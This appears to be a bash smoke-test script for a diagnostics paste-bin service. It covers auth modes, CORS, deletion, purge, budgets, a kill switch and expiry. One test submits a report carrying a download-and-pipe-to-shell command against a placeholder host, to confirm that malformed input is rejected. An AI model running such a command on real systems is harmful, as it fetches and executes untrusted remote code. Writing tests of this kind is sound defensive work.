IDLE_AFTER="$(authdb_num "SELECT last_active FROM sessions WHERE token='${IDLE_H}'")"
if [ -n "$IDLE_BEFORE" ] && [ "$IDLE_BEFORE" = "$IDLE_AFTER" ]; then
	pass "and a refused session is not revived by the slide"
else
	fail "and a refused session is not revived by the slide" "last_active ${IDLE_BEFORE:-?} -> ${IDLE_AFTER:-?}"
fi
# Revocation is authoritative: the session row is valid but the account is disabled.
check "session of a disabled account" 404 -H "Authorization: Bearer disabled-token" "${BASE}/admin/stats"

echo "-- the portal: proxied from PORTAL_UPSTREAM, and it must not shadow the API"
# Unset here, so /admin/ is honestly absent rather than pretending.
check "no portal when PORTAL_UPSTREAM is unset" 404 "${BASE}/admin/"
check "no portal assets either" 404 "${BASE}/admin/vendor/bootstrap.min.css"
# The redirect is load-bearing: without the trailing slash every relative asset in the page
# resolves against / and 404s.
check "bare /admin redirects to /admin/" 301 "${BASE}/admin"
RH="$(curl -s -D - -o /dev/null "${BASE}/admin")"
printf '%s' "$RH" | grep -qi "location:.*/admin/" && pass "and points at the trailing slash" || fail "redirect target" "$(printf '%s' "$RH" | grep -i location)"
# The trap this guards: the proxy path would otherwise swallow every API endpoint under
# /admin/. One of each, to prove the ordering holds.
check "admin/mode is API, not proxied" 200 "${BASE}/admin/mode"
body_has "and answers as the API" '"auth_mode"'
check "admin/stats is API, not proxied" 404 "${BASE}/admin/stats"
check "stats needs a session" 404 "${BASE}/admin/stats"
check "stats with a session" 200 -H "Authorization: Bearer ${ADMIN}" "${BASE}/admin/stats"
body_has "stats reports database size" '"database"'
body_has "stats reports today budget" '"budget"'
check "reports needs a session" 404 "${BASE}/admin/reports"
check "reports with a session" 200 -H "Authorization: Bearer ${ADMIN}" "${BASE}/admin/reports?limit=5"
body_has "report list has slugs" '"slug"'
# The page says "the latest 5 of N kept (up to 3 days)", so the listing has to carry the whole
# count and the window and not just the rows it returned.
body_has "listing carries the full total" '"total"'
body_has "and the retention window" '"retention_days"'
body_lacks "report list never returns bodies" '"body"'
# Hardware and build identity used to be lifted into columns and returned here. A paste bin
# keeping a device inventory is not something to reintroduce by accident.
body_lacks "report list carries no soc" '"soc"'
body_lacks "report list carries no model" '"model"'
body_lacks "report list carries no build" '"build"'
body_lacks "report list carries no censor ruleset" '"redacted"'
check "unknown admin subpath 404s" 404 -H "Authorization: Bearer ${ADMIN}" "${BASE}/admin/nonsense"
check "admin endpoints reject non-GET" 404 -X POST -H "Authorization: Bearer ${ADMIN}" "${BASE}/admin/stats"

# Every check above passes an explicit ?limit, which is exactly how an absent one went
# unnoticed: the parameter reached the query as LIMIT 0, so the documented curl commands
# answered with an empty list. The UI never hit it because it always sends one.
#
# "not empty" is too weak to pin this, and finding that out cost a round: the low clamp
# that stops a negative limit also turns a broken default of 0 into 1, which still looks
# non-empty. So compare the default against an explicit limit and require more than one
# row, which makes the comparison able to tell them apart at all.
echo "-- ?limit defaults and clamping"
count_of() { curl -s -H "Authorization: Bearer ${ADMIN}" "$1" | sed -n 's/.*"count": \([0-9]*\).*/\1/p' | head -1; }

same_count() { # same_count <name> <url-without-limit> <url-with-explicit-limit>
	local name="$1" got want
	want="$(count_of "$3")"
	got="$(count_of "$2")"
	if [ -z "$want" ] || [ -z "$got" ]; then
		fail "$name" "no count in one of the responses (default '$got', explicit '$want')"
	elif [ "$want" -le 1 ]; then
		fail "$name" "only $want row(s) stored, so this cannot distinguish a default of 50 from a clamp to 1"
	elif [ "$got" = "$want" ]; then
		pass "$name ($got rows both ways)"
	else
		fail "$name" "no limit gave $got, explicit limit gave $want"
	fi
}

same_count "reports default matches limit=50" "${BASE}/admin/reports" "${BASE}/admin/reports?limit=50"
same_count "events default matches limit=50" "${BASE}/admin/events" "${BASE}/admin/events?limit=50"
# ?ip= is its own query branch with its own LIMIT, and it is the documented
# abuse-follow-up path. Read the address back rather than assuming what dev reports.
check "event listing for the address" 200 -H "Authorization: Bearer ${ADMIN}" "${BASE}/admin/events?limit=50"
SUBIP="$(sed -n 's/.*"ip": "\([^"]*\)".*/\1/p' "$BODY" | head -1)"
same_count "events by ip default matches limit=50" "${BASE}/admin/events?ip=${SUBIP}" "${BASE}/admin/events?ip=${SUBIP}&limit=50"
same_count "non-numeric limit falls back to the default" "${BASE}/admin/reports?limit=abc" "${BASE}/admin/reports?limit=50"
# SQLite reads a negative LIMIT as no limit, so the 500 cap has to clamp low as well.
check "negative limit is clamped" 200 -H "Authorization: Bearer ${ADMIN}" "${BASE}/admin/reports?limit=-1"
body_has "negative limit returns one row, not the table" '"count": 1'

echo "-- auth modes: the bin must be usable without the builder"
check "mode endpoint is public" 200 "${BASE}/admin/mode"
body_has "mode is builder when AUTHDB is bound" '"auth_mode": "builder"'
check "a builder session still works" 200 -H "Authorization: Bearer ${ADMIN}" "${BASE}/admin/stats"
check "an admin key does not work in builder mode" 404 -H "Authorization: Bearer some-admin-key" "${BASE}/admin/stats"

echo "-- CORS is off unless a portal is hosted on another origin"
# The shipped portal is same-origin, so the default emits nothing and answers no preflight.
check "no preflight answered by default" 404 -X OPTIONS -H "Origin: https://example.test" -H "Access-Control-Request-Method: GET" "${BASE}/admin/stats"
SH="$(curl -s -D - -o /dev/null -H "Authorization: Bearer ${ADMIN}" "${BASE}/admin/stats")"
printf '%s' "$SH" | grep -qi "access-control-allow-origin" && fail "admin responses must not carry CORS by default" "allow-origin present" || pass "admin responses carry no CORS by default"
check "no preflight on a slug either" 404 -X OPTIONS "${BASE}/abcdefgh"
# Deliberately no CORS on reading a report: otherwise any site could fetch one.
CSLUG="$(submit_slug cors "$(report 'cors check')")"
RH="$(curl -s -D - -o /dev/null "${BASE}/${CSLUG}")"
printf '%s' "$RH" | grep -qi "access-control-allow-origin" && fail "report reads must not be CORS-enabled" "allow-origin present" || pass "report reads are not CORS-enabled"
check "preflight elsewhere 404s" 404 -X OPTIONS "${BASE}/robots.txt"

echo "-- delete"
check "delete with no token 404s" 404 -X DELETE "${BASE}/${TSLUG}"
check "delete with wrong token 404s" 404 -X DELETE -H "X-Delete-Token: wrongtokenwrongtokenwrong1" "${BASE}/${TSLUG}"
check "report survives failed delete" 200 "${BASE}/${TSLUG}"
check "delete with right token" 200 -X DELETE -H "X-Delete-Token: ${TOKEN}" "${BASE}/${TSLUG}"
body_has "delete response is just 'deleted'" "^deleted$"
body_lacks "delete response has no storage jargon" "Time Travel"
check "deleted report is gone" 404 "${BASE}/${TSLUG}"
# Admin delete stays: takedown is a real need even though promote is gone.
ASLUG="$(submit_slug admindel "$(report 'admin will delete this')")"
check "admin can delete without the submitter token" 200 -X DELETE -H "Authorization: Bearer ${ADMIN}" "${BASE}/${ASLUG}"
check "report gone after admin delete" 404 "${BASE}/${ASLUG}"
check "promote endpoint no longer exists" 404 -X POST -H "Authorization: Bearer ${ADMIN}" "${BASE}/${ASLUG}/promote"

echo "== count budget instance (DAILY_MAX=2) =="
# CORS with an explicit origin, for someone hosting the portal elsewhere. Its own instance,
# because ALLOW_ORIGIN is a deploy-time var and a restart wipes the storage the sections
# above still needed: putting this inline cost three passing checks the first time.
stop_dev
start_dev --var ALLOW_ORIGIN:https://portal.example
echo "-- CORS when an origin is configured"
check "preflight answered" 204 -X OPTIONS -H "Origin: https://portal.example" -H "Access-Control-Request-Method: GET" -H "Access-Control-Request-Headers: authorization" "${BASE}/admin/stats"
PH="$(curl -s -D - -o /dev/null -X OPTIONS "${BASE}/admin/stats")"
printf '%s' "$PH" | grep -qi "access-control-allow-origin: https://portal.example" && pass "preflight names that exact origin" || fail "preflight allow-origin" "$(printf '%s' "$PH" | grep -i allow-origin)"
printf '%s' "$PH" | grep -qi "access-control-allow-headers: authorization" && pass "preflight allows the auth header" || fail "preflight allow-headers" "$(printf '%s' "$PH" | grep -i allow-headers)"
check "preflight on a slug, for DELETE" 204 -X OPTIONS "${BASE}/abcdefgh"

stop_dev
start_dev --var DAILY_MAX:2
check "submission 1" 201 "${CH[@]}" --data-binary "$(report one)" "${BASE}/"
check "malformed 1 rejected" 422 --data-binary "no envelope" "${BASE}/"
check "malformed 2 rejected" 422 "${CH[@]}" --data-binary "$(report '(wget -qO- http://x/y.sh)|sh')" "${BASE}/"
# If rejected submissions had consumed the allowance this would be a 503, which is
# what makes the take-after-validate ordering observable from outside.
check "submission 2 still allowed" 201 "${CH[@]}" --data-binary "$(report two)" "${BASE}/"
check "submission 3 blocked" 503 "${CH[@]}" --data-binary "$(report three)" "${BASE}/"
body_has "503 names the diag count limit" "diag count"
body_has "503 mentions 00:00 UTC" "00:00 UTC"

echo "== byte budget instance (DAILY_MAX_BYTES=2000) =="
stop_dev
start_dev --var DAILY_MAX_BYTES:2000
check "small report fits the byte budget" 201 "${CH[@]}" --data-binary "$(report 'small')" "${BASE}/"
{ report 'padding'; logfiller 60; } >"${WORK}/over"
check "report over the byte budget blocked" 503 "${CH[@]}" --data-binary "@${WORK}/over" "${BASE}/"
body_has "503 names the byte budget" "byte budget"
rm -f "${WORK}/over"

echo "== token auth mode (self-hosting: no builder) =="
stop_dev
start_dev --var AUTH_MODE:token --var ADMIN_KEY:self-hosted-key
check "mode reports token" 200 "${BASE}/admin/mode"
body_has "auth_mode is token" '"auth_mode": "token"'
check "the admin key opens stats" 200 -H "Authorization: Bearer self-hosted-key" "${BASE}/admin/stats"
check "a wrong key does not" 404 -H "Authorization: Bearer nope" "${BASE}/admin/stats"
check "a builder session does not work here" 404 -H "Authorization: Bearer ${ADMIN}" "${BASE}/admin/stats"
check "admin delete works with the key" 200 -X DELETE -H "Authorization: Bearer self-hosted-key" "${BASE}/$(submit_slug tokenmode "$(report 'token mode')")"
check "submissions work as normal" 201 "${CH[@]}" --data-binary "$(report 'token mode still accepts')" "${BASE}/"

echo "== no auth mode (bin works, admin disabled) =="
stop_dev
start_dev --var AUTH_MODE:none
check "mode reports none" 200 "${BASE}/admin/mode"
body_has "auth_mode is none" '"auth_mode": "none"'
check "no credential opens stats" 404 -H "Authorization: Bearer ${ADMIN}" "${BASE}/admin/stats"
check "not even an admin key" 404 -H "Authorization: Bearer self-hosted-key" "${BASE}/admin/stats"
# The point of `none`: the bin is still a working paste bin.
NSLUG="$(submit_slug noauth "$(report 'no-auth mode')")"
check "submissions still work" 200 "${BASE}/${NSLUG}"
NRESP="$(curl -s "${CH[@]}" --data-binary "$(report 'delete token still works')" "${BASE}/")"
NTOK="$(printf '%s' "$NRESP" | grep -o 'X-Delete-Token: [a-z0-9]*' | awk '{print $2}')"
NSL2="$(printf '%s' "$NRESP" | head -1 | sed 's|.*/||')"
check "submitters can still delete their own" 200 -X DELETE -H "X-Delete-Token: ${NTOK}" "${BASE}/${NSL2}"

echo "== strict envelope mode =="
# Its own instance: purging deletes every report, so it cannot run before any section that
# still needs one. Putting it inline cost three passing checks the first time.
stop_dev
start_dev
echo "-- portal cache policy: only fingerprinted files may be cached"
# A deploy served new markup beside a ten-minute-old admin.js once, and the new controls
# silently did nothing. Nothing in the portal carries a content hash except vendor/.
# A free port, chosen at run time. A fixed one was already taken by an unrelated long-running
# server on the same host, so the Worker proxied THAT and the checks passed against someone
# else's page. Hence the content assertion below too: never trust a 200 alone to mean the
# stand-in is the thing being served.
PAGES_PORT="$(python3 -c 'import socket;s=socket.socket();s.bind(("127.0.0.1",0));print(s.getsockname()[1]);s.close()')"
python3 -m http.server "$PAGES_PORT" --bind 127.0.0.1 --directory web >/dev/null 2>&1 &
PAGES_PID=$!
curl -s -m 10 --retry 40 --retry-delay 1 --retry-connrefused "http://127.0.0.1:${PAGES_PORT}/index.html" \
	| grep -q 'Diagnostics Bin Admin' \
	|| { echo "the static stand-in on ${PAGES_PORT} is not serving web/; aborting"; kill -9 "$PAGES_PID" 2>/dev/null; exit 1; }
stop_dev
start_dev --var PORTAL_UPSTREAM:"http://127.0.0.1:${PAGES_PORT}"
for f in "" admin.js config.js; do
	CC="$(curl -s -D - -o /dev/null "${BASE}/admin/${f}" | tr -d '\r' | grep -i '^cache-control' | sed 's/[Cc]ache-[Cc]ontrol: //')"
	[ "$CC" = "no-store" ] && pass "/admin/${f:-index.html} is not cached ($CC)" || fail "/admin/${f:-index.html} cache policy" "got '$CC', wanted no-store"
done
for f in vendor/bootstrap.min.css favicon.svg; do
	CC="$(curl -s -D - -o /dev/null "${BASE}/admin/${f}" | tr -d '\r' | grep -i '^cache-control' | sed 's/[Cc]ache-[Cc]ontrol: //')"
	case "$CC" in *max-age*) pass "/admin/$f is cacheable ($CC)" ;; *) fail "/admin/$f cache policy" "got '$CC', wanted max-age" ;; esac
done
check "the proxied portal actually serves the page" 200 "${BASE}/admin/"
body_has "and it is the admin page" "Diagnostics Bin Admin"
kill -9 "$PAGES_PID" 2>/dev/null
stop_dev
start_dev

echo "-- the kill switch: refuse submissions, leave everything else alone"
check "pause needs a credential" 404 -X POST "${BASE}/admin/pause?state=on"
check "pause needs a state" 400 -X POST -H "Authorization: Bearer ${ADMIN}" "${BASE}/admin/pause"
check "pause rejects a nonsense state" 400 -X POST -H "Authorization: Bearer ${ADMIN}" "${BASE}/admin/pause?state=maybe"
KSLUG="$(submit_slug killswitch "$(report 'before the pause')")"
check "pause on" 200 -X POST -H "Authorization: Bearer ${ADMIN}" "${BASE}/admin/pause?state=on"
body_has "and says so" '"paused": true'
check "submissions are refused while paused" 503 "${CH[@]}" --data-binary "$(report 'during the pause')" "${BASE}/"
body_has "with an operator message, not a budget one" "not accepting submissions"
body_lacks "and does not tell them to wait for a reset" "00:00 UTC"
# Reads, and everything else, must keep working: pausing is not hiding.
check "reads still work while paused" 200 "${BASE}/${KSLUG}"
check "the admin API still works while paused" 200 -H "Authorization: Bearer ${ADMIN}" "${BASE}/admin/stats"
body_has "stats reports the switch" '"paused": true'
check "pause off" 200 -X POST -H "Authorization: Bearer ${ADMIN}" "${BASE}/admin/pause?state=off"
body_has "and says so" '"paused": false'
check "submissions work again" 201 "${CH[@]}" --data-binary "$(report 'after the pause')" "${BASE}/"
# Both sides of the switch are logged, with the admin named, which is the point of the log.
check "the switch is logged" 200 -H "Authorization: Bearer ${ADMIN}" "${BASE}/admin/events?limit=50"
body_has "pausing logged" '"kind": "paused"'
body_has "resuming logged" '"kind": "resumed"'
body_has "and names who did it" '"admin": "smoketest"'
# A single delete is logged too, by whoever did it.
check "delete the kill switch report" 200 -X DELETE -H "Authorization: Bearer ${ADMIN}" "${BASE}/${KSLUG}"
check "the delete is logged" 200 -H "Authorization: Bearer ${ADMIN}" "${BASE}/admin/events?slug=${KSLUG}"
body_has "as a delete event" '"kind": "delete"'

echo "-- purge: a takedown tool, and it must be hard to fire by accident"
PSLUG="$(submit_slug purge "$(report 'purge target')")"
check "purge needs a credential" 404 -X DELETE "${BASE}/admin/reports?confirm=all"
check "purge needs the confirm parameter" 400 -X DELETE -H "Authorization: Bearer ${ADMIN}" "${BASE}/admin/reports"
body_has "and says which parameter" "confirm=all"
check "the report is still there" 200 "${BASE}/${PSLUG}"
check "purge reports" 200 -X DELETE -H "Authorization: Bearer ${ADMIN}" "${BASE}/admin/reports?confirm=all"
body_has "purge reports reports a count" '"deleted"'
body_has "and what is left" '"remaining": 0'
check "the report is gone" 404 "${BASE}/${PSLUG}"
# Deliberate: the log outlives the reports it points at, so purging reports must not take the
# event rows with it.
check "the submit event survives a report purge" 200 -H "Authorization: Bearer ${ADMIN}" "${BASE}/admin/events?slug=${PSLUG}"
body_has "the record is still there" "${PSLUG}"
check "clear the log" 200 -X DELETE -H "Authorization: Bearer ${ADMIN}" "${BASE}/admin/events?confirm=all"
body_has "and that reports a count too" '"purged": "events"'
check "the log is cleared" 200 -H "Authorization: Bearer ${ADMIN}" "${BASE}/admin/events?limit=5"
body_lacks "the submission rows are gone" "${PSLUG}"
# The clearing is logged after the deletes, deliberately, so it does not erase the record of
# itself. One row left, not none.
body_has "and the clearing logged itself" '"kind": "purge_events"'
# The two seeded logins belong to the builder and are not ours to delete, so they survive: the
# purge row plus those two.
body_has "the login trail survives a cleared log" '"kind": "admin_login_ok"'
body_has "our row plus the builder's two" '"count": 3'
# The portal proxy must not swallow a DELETE to an API path, and an unknown one still 404s.
check "purge on an unknown table 404s" 404 -X DELETE -H "Authorization: Bearer ${ADMIN}" "${BASE}/admin/nonsense?confirm=all"

stop_dev
start_dev --var REQUIRE_ENVELOPE:1
check "a report is accepted" 201 "${CH[@]}" --data-binary "$(report 'strict mode')" "${BASE}/"
check "arbitrary text is refused when the envelope is required" 422 "${CH[@]}" --data-binary "just some output" "${BASE}/"
body_has "refusal stays opaque" "not accepted"

echo "== paste budget instance (PASTE_DAILY_MAX=1, diag untouched) =="
stop_dev
start_dev --var PASTE_DAILY_MAX:1
check "first paste allowed" 201 --data-binary "some output" -H "X-Thingino-Client: ${CLIENT}" "${BASE}/"
check "second paste blocked" 503 --data-binary "more output" -H "X-Thingino-Client: ${CLIENT}" "${BASE}/"
body_has "503 names the paste allowance" "paste count"
# The permissive door must not be able to spend the diag allowance.
check "diag report still accepted after paste budget is spent" 201 "${CH[@]}" --data-binary "$(report 'diag still works')" "${BASE}/"

echo "== expiry and cron reclaim (TTL_DAYS=-1, already past) =="
stop_dev
start_dev --var TTL_DAYS:-1
ESLUG="$(submit_slug expiry "$(report 'stale report')")"
check "expired report returns 410" 410 "${BASE}/${ESLUG}"
body_has "410 tells maintainer to ask for a fresh log" "fresh one"
check "expired report HEAD also 410s" 410 -I "${BASE}/${ESLUG}"
# Read-time expiry is authoritative; the cron only reclaims storage.
curl -s -o /dev/null "${BASE}/cdn-cgi/handler/scheduled"
check "reclaimed row is now absent, not just expired" 404 "${BASE}/${ESLUG}"
# Nothing is exempt: there is no longer any path that sets a row to never expire.
# Submit first, then reclaim, or the row is merely expired (410) and not yet gone.
RSLUG="$(submit_slug reclaim "$(report 'also stale')")"
check "second report is expired but still present" 410 "${BASE}/${RSLUG}"
curl -s -o /dev/null "${BASE}/cdn-cgi/handler/scheduled"
check "and the reclaimer takes it too, nothing is exempt" 404 "${BASE}/${RSLUG}"
# The event log has a longer clock, so reclaiming the report must not remove its row.
check "submit event survives the report" 200 -H "Authorization: Bearer ${ADMIN}" "${BASE}/admin/events?slug=${RSLUG}"
body_has "record still there after the report is gone" "${RSLUG}"
# And a reclaim logs itself, which is what the portal shows for expiry.
check "the reclaim is logged" 200 -H "Authorization: Bearer ${ADMIN}" "${BASE}/admin/events?limit=50"
body_has "as a reap event" '"kind": "reap"'
body_has "naming what it expired" '"detail": "expired'

stop_dev
echo
echo "passed: $PASS   failed: $FAIL"
[ "$FAIL" -eq 0 ] || exit 1
